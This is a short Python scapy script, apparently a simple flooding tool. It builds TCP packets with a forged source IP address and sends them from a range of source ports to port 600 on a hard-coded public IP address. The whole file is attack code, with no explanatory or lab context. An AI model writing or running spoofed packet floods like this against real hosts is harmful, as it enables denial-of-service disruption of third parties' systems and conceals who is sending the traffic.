from scapy.all import *


def floodZ(src, tar):
    for i in range(100, 150):
        IPlayer = IP(src=src, dst=tar)
        TCPlayer = TCP(sport=i, dport=600)
        pkt = IPlayer / TCPlayer
        send(pkt)


source = "192.168.43.117"
target = "162.241.24.197"

floodZ(source, target)